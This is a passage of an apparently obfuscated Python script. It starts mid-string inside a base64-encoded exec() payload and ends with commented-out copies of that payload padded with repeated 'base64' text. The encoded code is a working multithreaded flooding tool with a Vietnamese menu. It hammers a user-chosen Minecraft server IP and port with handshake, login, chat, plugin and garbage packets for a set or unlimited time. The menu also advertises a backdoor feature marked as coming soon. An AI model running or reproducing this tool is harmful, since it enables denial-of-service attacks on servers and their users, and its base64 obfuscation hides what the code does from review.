A1KQoKICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UocmFuZG9tLnJhbmRpbnQoMiwgNikpOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3JhbmRvbV9wYWNrZXQoKQoKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgc3VjY2Vzc19jb3VudCArPSAxCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaMOgbmggQ8O0bmcgIXtDb2xvcnMuRU5EQ30iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaOG6pXQgQuG6oWl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgZmFpbF9jb3VudCArPSAxCiAgICAgICAgZmluYWxseToKICAgICAgICAgICAgc2VsZi5zb2NrLmNsb3NlKCkKCiAgICBkZWYgc2VuZF9yYW5kb21fcGFja2V0KHNlbGYpOgogICAgICAgIHBrdF90eXBlID0gcmFuZG9tLmNob2ljZShbImNoYXQiLCAicGx1Z2luIiwgImtlZXBhbGl2ZSIsICJjdXN0b20iXSkKCiAgICAgICAgaWYgcGt0X3R5cGUgPT0gImNoYXQiOgogICAgICAgICAgICBtc2cgPSBlbmNvZGVfc3RyaW5nKHJhbmRvbV9jaGF0KCkpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMywgbXNnKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gInBsdWdpbiI6CiAgICAgICAgICAgIGNoYW5uZWwgPSBlbmNvZGVfc3RyaW5nKCJNQ3xCcmFuZCIpCiAgICAgICAgICAgIGRhdGEgPSBlbmNvZGVfc3RyaW5nKCJMQUMxM19DdXN0b21DbGllbnQiKQogICAgICAgICAgICBzZW5kX3BhY2tldChzZWxmLnNvY2ssIDB4MTcsIGNoYW5uZWwgKyBkYXRhKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gImtlZXBhbGl2ZSI6CiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgyMSwgZW5jb2RlX3ZhcmludChyYW5kb20ucmFuZGludCgxMDAwMCwgOTk5OTk5KSkpCiAgICAgICAgZWxpZiBwa3RfdHlwZSA9PSAiY3VzdG9tIjoKICAgICAgICAgICAgZ2FyYmFnZSA9IGJ5dGVzKHJhbmRvbS5nZXRyYW5kYml0cyg4KSBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCgxMCwgMzApKSkKICAgICAgICAgICAgZmFrZV9pZCA9IHJhbmRvbS5yYW5kaW50KDB4MDEsIDB4M0YpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgZmFrZV9pZCwgZ2FyYmFnZSkKCmRlZiBzdGFydF9hdHRhY2soaXAsIHBvcnQsIHBhY2tldHNfcGVyX3JvdW5kLCBkdXJhdGlvbik6CiAgICBzdGFydF90aW1lID0gdGltZS50aW1lKCkKICAgIHBhY2tldF9pZCA9IDEKCiAgICB0cnk6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgdGhyZWFkcyA9IFtdCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKHBhY2tldHNfcGVyX3JvdW5kKToKICAgICAgICAgICAgICAgIHQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1NaXhlZFBhY2tldEZsb29kZXIoaXAsIHBvcnQsIHBhY2tldF9pZCkucnVuKQogICAgICAgICAgICAgICAgdC5zdGFydCgpCiAgICAgICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICAgICAgcGFja2V0X2lkICs9IDEKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wMDIpCgogICAgICAgICAgICBmb3IgdCBpbiB0aHJlYWRzOgogICAgICAgICAgICAgICAgdC5qb2luKCkKCiAgICAgICAgICAgIGlmIGR1cmF0aW9uICE9IDAgYW5kIHRpbWUudGltZSgpIC0gc3RhcnRfdGltZSA+PSBkdXJhdGlvbjoKICAgICAgICAgICAgICAgIGJyZWFrCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJpbnQoZiJcbntDb2xvcnMuV0FSTklOR33Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gROG7q25nIGLhu59pIG5nxrDhu51pIGTDuW5nLntDb2xvcnMuRU5EQ30iKQogICAgZmluYWxseToKICAgICAgICBwcmludChmIlxue0NvbG9ycy5IRUFERVJ9yp/htIDhtIThtI3htIDJqsqA4bSA4bSYIOG0m+G0j+G0j8qfIFThuqROIEPDlE5HIEvhur5UIFRIw5pDe0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59VGjDoG5oIGPDtG5nOiB7c3VjY2Vzc19jb3VudH17Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1UaOG6pXQgYuG6oWk6IHtmYWlsX2NvdW50fXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfVThu5VuZyB0aOG7nWkgZ2lhbjoge2ludCh0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUpfSBnacOieXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHdhaXRfZm9yX3JldHVybigpCgpkZWYgd2FpdF9mb3JfcmV0dXJuKCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGlucCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfXtJY29ucy5BUlJPV30gTmjhuq1wIDAgxJHhu4MgcXVheSBs4bqhaSBtZW51OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgIGlmIGlucCA9PSAiMCI6CiAgICAgICAgICAgIGJyZWFrCgpkZWYgY2hlY2tfc2VydmVyKGlwLCBwb3J0KToKICAgIHRyeToKICAgICAgICB0ZXN0X3NvY2sgPSBzb2NrZXQuc29ja2V0KCkKICAgICAgICB0ZXN0X3NvY2suc2V0dGltZW91dCgzKQogICAgICAgIHRlc3Rfc29jay5jb25uZWN0KChpcCwgcG9ydCkpCiAgICAgICAgdGVzdF9zb2NrLmNsb3NlKCkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIHNob3dfbWVudSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0JMVUV9e0ljb25zLlNUQVIqM30gSMOjeSBHaGkgc+G7kSDEkeG7gyBzw6BpIMqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyB7SWNvbnMuU1RBUiozfXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59e0ljb25zLkNIRUNLfSAxLiBIaeG7h24gU3RhdHVze0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiIgICB7Q29sb3JzLklORk99SGnhu4duIHRow7RuZyB0aW4sIGNo4bupYyBuxINuZyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfXtJY29ucy5DSEVDS0JPWH0gMi4gSGnhu4duIFRvb2xzIMSRYW5nIHPDoGl7Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIiAgIHtDb2xvcnMuSU5GT31IxrDhu5tuZyBk4bqrbiBjw6FjaCBz4butIGThu6VuZyB0b29sIGRvcyBj4bunYSDKn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp97Q29sb3JzLkVOREN9XG4iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5XQVJOSU5HfXtJY29ucy5XQVJOSU5HfSAzLiBIaeG7h24gVG9vbHMgQmFja2Rvb3IgKENvbWluZyBzb29uKXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfVTDrW5oIG7Eg25nIEJhY2tkb29yIGhp4buHbiBjaMawYSBraOG6oyBk4bulbmcsIHPhur0gY+G6rXAgbmjhuq10IHNhdXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkZBSUx9e0ljb25zLkNST1NTfSA0LiBU4bqlbiBDw7RuZyBJcHtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYiICAge0NvbG9ycy5JTkZPfUto4bufaSDEkeG7mW5nIGNo4bupYyBuxINuZyB04bqlbiBjw7RuZyBn4butaSBwYWNrZXQgxJHhur9uIElQIHNlcnZlciDEkcOjIG5o4bqtcHtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLkhFQURFUn17SWNvbnMuTkVYVH0gMC4gVGhvw6F0e0NvbG9ycy5FTkRDfVxuIikKCiAgICAgICAgY2hvaWNlID0gaW5wdXQoZiJ7Q29sb3JzLkJPTER9e0ljb25zLkFSUk9XfSBDaOG7jW46IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCgogICAgICAgIGlmIGNob2ljZSA9PSAiMSI6CiAgICAgICAgICAgIGNsZWFyX3NjcmVlbigpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBsw6AgY8O0bmcgY+G7pSBn4butaSBwYWNrZXQgaOG7l24gaOG7o3AgTWluZWNyYWZ0IMSR4buDIGtp4buDbSB0cmEga2jhuqMgbsSDbmcgY2jhu4t1IHThuqNpIHNlcnZlci57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLklORk99SOG7lyB0cuG7oyBuaGnhu4F1IGxv4bqhaSBwYWNrZXQgbmjGsCBjaGF0LCBwbHVnaW4sIGtlZXBhbGl2ZSwgY3VzdG9tLCB2LnYue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjIiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tHUkVFTn1Ub29scyDEkWFuZyBzw6BpOntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBoYW5kc2hha2UiKQogICAgICAgICAgICBwcmludChmIiAtIEfhu61pIHBhY2tldCBsb2dpbiBzdGFydCIpCiAgICAgICAgICAgIHByaW50KGYiIC0gR+G7rWkgcGFja2V0IGNoYXQsIHBsdWdpbiwga2VlcGFsaXZlLCBjdXN0b20gbmfhuqt1IG5oacOqbiIpCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfULhuqFuIGPDsyB0aOG7gyB0w7l5IGNo4buNbiBz4buRIGzGsOG7o25nIHBhY2tldCBn4butaSB2w6AgdGjhu51pIGdpYW4gdOG6pW4gY8O0bmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjMiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBwcmludChmIntDb2xvcnMuV0FSTklOR31Uw61uaCBuxINuZyBCYWNrZG9vciDEkWFuZyB0cm9uZyBxdcOhIHRyw6xuaCBwaMOhdCB0cmnhu4NuIHbDoCBjaMawYSBraOG6oyBk4bulbmcue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjQiOgogICAgICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgICAgICBpcCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBJUCBzZXJ2ZXIgTWluZWNyYWZ0OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwb3J0X3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfU5o4bqtcCBQb3J0ICht4bq3YyDEkeG7i25oIDI1NTY1KToge0NvbG9ycy5FTkRDfSIpLnN0cmlwKCkKICAgICAgICAgICAgcG9ydCA9IGludChwb3J0X3N0cikgaWYgcG9ydF9zdHIuaXNkaWdpdCgpIGVsc2UgMjU1NjUKICAgICAgICAgICAgaWYgbm90IGNoZWNrX3NlcnZlcihpcCwgcG9ydCk6CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1LaMO0bmcgdGjhu4Mga+G6v3QgbuG7kWkgdOG7m2kgc2VydmVyIHtpcH06e3BvcnR9LiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSBJUCBob+G6t2MgUG9ydC57Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdhaXRfZm9yX3JldHVybigpCiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBwYWNrZXRzX3N0ciA9IGlucHV0KGYie0NvbG9ycy5CT0xEfVPhu5EgbMaw4bujbmcgcGFja2V0IGfhu61pIG3hu5dpIGzhuqduICh2ZDogMTApOiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgICAgICBwYWNrZXRzID0gaW50KHBhY2tldHNfc3RyKSBpZiBwYWNrZXRzX3N0ci5pc2RpZ2l0KCkgZWxzZSAxMAogICAgICAgICAgICBkdXJhdGlvbl9zdHIgPSBpbnB1dChmIntDb2xvcnMuQk9MRH1UaOG7nWkgZ2lhbiB04bqlbiBjw7RuZyAoZ2nDonksIG5o4bqtcCAwIMSR4buDIHbDtCBo4bqhbik6IHtDb2xvcnMuRU5EQ30iKS5zdHJpcCgpCiAgICAgICAgICAgIGR1cmF0aW9uID0gaW50KGR1cmF0aW9uX3N0cikgaWYgZHVyYXRpb25fc3RyLmlzZGlnaXQoKSBlbHNlIDAKICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLldBUk5JTkd9QuG6r3QgxJHhuqd1IHThuqVuIGPDtG5nIElQIHtpcH06e3BvcnR9Li4ue0NvbG9ycy5FTkRDfSIpCiAgICAgICAgICAgIHN0YXJ0X2F0dGFjayhpcCwgcG9ydCwgcGFja2V0cywgZHVyYXRpb24pCiAgICAgICAgZWxpZiBjaG9pY2UgPT0gIjAiOgogICAgICAgICAgICBwcmludChmIntDb2xvcnMuT0tCTFVFfVRob8OhdCBjaMawxqFuZyB0csOsbmguIEjhurluIGfhurdwIGzhuqFpIXtDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICBicmVhawogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfUzhu7FhIGNo4buNbiBraMO0bmcgaOG7o3AgbOG7hy4gVnVpIGzDsm5nIHRo4butIGzhuqFpLntDb2xvcnMuRU5EQ30iKQogICAgICAgICAgICB0aW1lLnNsZWVwKDEpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgc2hvd19tZW51KCkK').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('').decode('utf-8'))
#import base64 #base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64base64
#exec(base64.b64decode('CmltcG9ydCBzb2NrZXQKaW1wb3J0IHRocmVhZGluZwppbXBvcnQgdGltZQppbXBvcnQgcmFuZG9tCmltcG9ydCBzdHJpbmcKaW1wb3J0IG9zCgpjbGFzcyBDb2xvcnM6CiAgICBIRUFERVIgPSAnXDAzM1s5NW0nCiAgICBPS0JMVUUgPSAnXDAzM1s5NG0nCiAgICBPS0dSRUVOID0gJ1wwMzNbOTJtJwogICAgV0FSTklORyA9ICdcMDMzWzkzbScKICAgIEZBSUwgPSAnXDAzM1s5MW0nCiAgICBJTkZPID0gJ1wwMzNbOTZtJwogICAgRU5EQyA9ICdcMDMzWzBtJwogICAgQk9MRCA9ICdcMDMzWzFtJwoKY2xhc3MgSWNvbnM6CiAgICBBUlJPVyA9ICfilronCiAgICBDSEVDSyA9ICfinJQnCiAgICBDUk9TUyA9ICfinJgnCiAgICBTVEFSID0gJ+KYhScKICAgIFdBUk5JTkcgPSAn4pigJwogICAgSU5GTyA9ICfinIknCiAgICBORVhUID0gJ+KepCcKICAgIENIRUNLQk9YID0gJ+KYkScKICAgIEJVTExFVCA9ICfinKYnCgpkZWYgY2xlYXJfc2NyZWVuKCk6CiAgICBvcy5zeXN0ZW0oJ2NscycgaWYgb3MubmFtZSA9PSAnbnQnIGVsc2UgJ2NsZWFyJykKCnN1Y2Nlc3NfY291bnQgPSAwCmZhaWxfY291bnQgPSAwCmxvY2sgPSB0aHJlYWRpbmcuTG9jaygpCgpkZWYgZW5jb2RlX3ZhcmludCh2YWx1ZSk6CiAgICByZXN1bHQgPSBiJycKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdGVtcCA9IHZhbHVlICYgMHg3RgogICAgICAgIHZhbHVlID4+PSA3CiAgICAgICAgaWYgdmFsdWU6CiAgICAgICAgICAgIHRlbXAgfD0gMHg4MAogICAgICAgIHJlc3VsdCArPSBieXRlcyhbdGVtcF0pCiAgICAgICAgaWYgbm90IHZhbHVlOgogICAgICAgICAgICBicmVhawogICAgcmV0dXJuIHJlc3VsdAoKZGVmIGVuY29kZV9zdHJpbmcocyk6CiAgICBkYXRhID0gcy5lbmNvZGUoJ3V0Zi04JykKICAgIHJldHVybiBlbmNvZGVfdmFyaW50KGxlbihkYXRhKSkgKyBkYXRhCgpkZWYgc2VuZF9wYWNrZXQoc29jaywgcGFja2V0X2lkLCBkYXRhKToKICAgIHBhY2tldCA9IGJ5dGVzKFtwYWNrZXRfaWRdKSArIGRhdGEKICAgIGxlbmd0aCA9IGVuY29kZV92YXJpbnQobGVuKHBhY2tldCkpCiAgICBzb2NrLnNlbmRhbGwobGVuZ3RoICsgcGFja2V0KQoKZGVmIGdlbmVyYXRlX3VzZXJuYW1lKCk6CiAgICByZXR1cm4gIlVzZXJfIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZXMoc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMsIGs9OCkpCgpkZWYgcmFuZG9tX2NoYXQoKToKICAgIHJldHVybiAnJy5qb2luKHJhbmRvbS5jaG9pY2VzKHN0cmluZy5hc2NpaV9sZXR0ZXJzICsgc3RyaW5nLmRpZ2l0cywgaz1yYW5kb20ucmFuZGludCg1LCAyMCkpKQoKY2xhc3MgTWl4ZWRQYWNrZXRGbG9vZGVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGlwLCBwb3J0LCBwYWNrZXRfaWQpOgogICAgICAgIHNlbGYuaXAgPSBpcAogICAgICAgIHNlbGYucG9ydCA9IHBvcnQKICAgICAgICBzZWxmLnBhY2tldF9pZCA9IHBhY2tldF9pZAogICAgICAgIHNlbGYuc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKCiAgICBkZWYgY29ubmVjdChzZWxmKToKICAgICAgICBzZWxmLnNvY2suc2V0dGltZW91dCgzKQogICAgICAgIHNlbGYuc29jay5jb25uZWN0KChzZWxmLmlwLCBzZWxmLnBvcnQpKQoKICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgZ2xvYmFsIHN1Y2Nlc3NfY291bnQsIGZhaWxfY291bnQKICAgICAgICB0cnk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNlbGYuY29ubmVjdCgpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH3Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gU0VSVkVSIE3huqRUIEvhur5UIE7hu5BJICggQ0jhur5UICl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgICAgIHdpdGggbG9jazoKICAgICAgICAgICAgICAgICAgICBmYWlsX2NvdW50ICs9IDEKICAgICAgICAgICAgICAgIHJldHVybgoKICAgICAgICAgICAgaGFuZHNoYWtlID0gKAogICAgICAgICAgICAgICAgZW5jb2RlX3ZhcmludCg3NTQpICsKICAgICAgICAgICAgICAgIGVuY29kZV9zdHJpbmcoc2VsZi5pcCkgKwogICAgICAgICAgICAgICAgc2VsZi5wb3J0LnRvX2J5dGVzKDIsICdiaWcnKSArCiAgICAgICAgICAgICAgICBlbmNvZGVfdmFyaW50KDIpICAjIE5leHQgc3RhdGUgPSBsb2dpbgogICAgICAgICAgICApCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgaGFuZHNoYWtlKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDIpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMCwgZW5jb2RlX3N0cmluZyhnZW5lcmF0ZV91c2VybmFtZSgpKSkKICAgICAgICAgICAgdGltZS5zbGVlcCgwLjA1KQoKICAgICAgICAgICAgZm9yIF8gaW4gcmFuZ2UocmFuZG9tLnJhbmRpbnQoMiwgNikpOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3JhbmRvbV9wYWNrZXQoKQoKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgc3VjY2Vzc19jb3VudCArPSAxCiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5PS0dSRUVOfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaMOgbmggQ8O0bmcgIXtDb2xvcnMuRU5EQ30iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHByaW50KGYie0NvbG9ycy5GQUlMfcqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyBbIHtzZWxmLnBhY2tldF9pZH0gXSBH4butaSBUaOG6pXQgQuG6oWl7Q29sb3JzLkVOREN9IikKICAgICAgICAgICAgd2l0aCBsb2NrOgogICAgICAgICAgICAgICAgZmFpbF9jb3VudCArPSAxCiAgICAgICAgZmluYWxseToKICAgICAgICAgICAgc2VsZi5zb2NrLmNsb3NlKCkKCiAgICBkZWYgc2VuZF9yYW5kb21fcGFja2V0KHNlbGYpOgogICAgICAgIHBrdF90eXBlID0gcmFuZG9tLmNob2ljZShbImNoYXQiLCAicGx1Z2luIiwgImtlZXBhbGl2ZSIsICJjdXN0b20iXSkKCiAgICAgICAgaWYgcGt0X3R5cGUgPT0gImNoYXQiOgogICAgICAgICAgICBtc2cgPSBlbmNvZGVfc3RyaW5nKHJhbmRvbV9jaGF0KCkpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgwMywgbXNnKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gInBsdWdpbiI6CiAgICAgICAgICAgIGNoYW5uZWwgPSBlbmNvZGVfc3RyaW5nKCJNQ3xCcmFuZCIpCiAgICAgICAgICAgIGRhdGEgPSBlbmNvZGVfc3RyaW5nKCJMQUMxM19DdXN0b21DbGllbnQiKQogICAgICAgICAgICBzZW5kX3BhY2tldChzZWxmLnNvY2ssIDB4MTcsIGNoYW5uZWwgKyBkYXRhKQogICAgICAgIGVsaWYgcGt0X3R5cGUgPT0gImtlZXBhbGl2ZSI6CiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgMHgyMSwgZW5jb2RlX3ZhcmludChyYW5kb20ucmFuZGludCgxMDAwMCwgOTk5OTk5KSkpCiAgICAgICAgZWxpZiBwa3RfdHlwZSA9PSAiY3VzdG9tIjoKICAgICAgICAgICAgZ2FyYmFnZSA9IGJ5dGVzKHJhbmRvbS5nZXRyYW5kYml0cyg4KSBmb3IgXyBpbiByYW5nZShyYW5kb20ucmFuZGludCgxMCwgMzApKSkKICAgICAgICAgICAgZmFrZV9pZCA9IHJhbmRvbS5yYW5kaW50KDB4MDEsIDB4M0YpCiAgICAgICAgICAgIHNlbmRfcGFja2V0KHNlbGYuc29jaywgZmFrZV9pZCwgZ2FyYmFnZSkKCmRlZiBzdGFydF9hdHRhY2soaXAsIHBvcnQsIHBhY2tldHNfcGVyX3JvdW5kLCBkdXJhdGlvbik6CiAgICBzdGFydF90aW1lID0gdGltZS50aW1lKCkKICAgIHBhY2tldF9pZCA9IDEKCiAgICB0cnk6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgdGhyZWFkcyA9IFtdCiAgICAgICAgICAgIGZvciBfIGluIHJhbmdlKHBhY2tldHNfcGVyX3JvdW5kKToKICAgICAgICAgICAgICAgIHQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1NaXhlZFBhY2tldEZsb29kZXIoaXAsIHBvcnQsIHBhY2tldF9pZCkucnVuKQogICAgICAgICAgICAgICAgdC5zdGFydCgpCiAgICAgICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICAgICAgcGFja2V0X2lkICs9IDEKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wMDIpCgogICAgICAgICAgICBmb3IgdCBpbiB0aHJlYWRzOgogICAgICAgICAgICAgICAgdC5qb2luKCkKCiAgICAgICAgICAgIGlmIGR1cmF0aW9uICE9IDAgYW5kIHRpbWUudGltZSgpIC0gc3RhcnRfdGltZSA+PSBkdXJhdGlvbjoKICAgICAgICAgICAgICAgIGJyZWFrCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgcHJpbnQoZiJcbntDb2xvcnMuV0FSTklOR33Kn+G0gOG0hOG0jeG0gMmqyoDhtIDhtJgg4bSb4bSP4bSPyp8gROG7q25nIGLhu59pIG5nxrDhu51pIGTDuW5nLntDb2xvcnMuRU5EQ30iKQogICAgZmluYWxseToKICAgICAgICBwcmludChmIlxue0NvbG9ycy5IRUFERVJ9yp/htIDhtIThtI3htIDJqsqA4bSA4bSYIOG0m+G0j+G0j8qfIFThuqROIEPDlE5HIEvhur5UIFRIw5pDe0NvbG9ycy5FTkRDfSIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59VGjDoG5oIGPDtG5nOiB7c3VjY2Vzc19jb3VudH17Q29sb3JzLkVOREN9IikKICAgICAgICBwcmludChmIntDb2xvcnMuRkFJTH1UaOG6pXQgYuG6oWk6IHtmYWlsX2NvdW50fXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHByaW50KGYie0NvbG9ycy5JTkZPfVThu5VuZyB0aOG7nWkgZ2lhbjoge2ludCh0aW1lLnRpbWUoKSAtIHN0YXJ0X3RpbWUpfSBnacOieXtDb2xvcnMuRU5EQ30iKQogICAgICAgIHdhaXRfZm9yX3JldHVybigpCgpkZWYgd2FpdF9mb3JfcmV0dXJuKCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGlucCA9IGlucHV0KGYie0NvbG9ycy5CT0xEfXtJY29ucy5BUlJPV30gTmjhuq1wIDAgxJHhu4MgcXVheSBs4bqhaSBtZW51OiB7Q29sb3JzLkVOREN9Iikuc3RyaXAoKQogICAgICAgIGlmIGlucCA9PSAiMCI6CiAgICAgICAgICAgIGJyZWFrCgpkZWYgY2hlY2tfc2VydmVyKGlwLCBwb3J0KToKICAgIHRyeToKICAgICAgICB0ZXN0X3NvY2sgPSBzb2NrZXQuc29ja2V0KCkKICAgICAgICB0ZXN0X3NvY2suc2V0dGltZW91dCgzKQogICAgICAgIHRlc3Rfc29jay5jb25uZWN0KChpcCwgcG9ydCkpCiAgICAgICAgdGVzdF9zb2NrLmNsb3NlKCkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIHNob3dfbWVudSgpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBjbGVhcl9zY3JlZW4oKQogICAgICAgIHByaW50KGYie0NvbG9ycy5PS0JMVUV9e0ljb25zLlNUQVIqM30gSMOjeSBHaGkgc+G7kSDEkeG7gyBzw6BpIMqf4bSA4bSE4bSN4bSAyarKgOG0gOG0mCDhtJvhtI/htI/KnyB7SWNvbnMuU1RBUiozfXtDb2xvcnMuRU5EQ31cbiIpCiAgICAgICAgcHJpbnQoZiJ7Q29sb3JzLk9LR1JFRU59e0ljb25zLkNIRU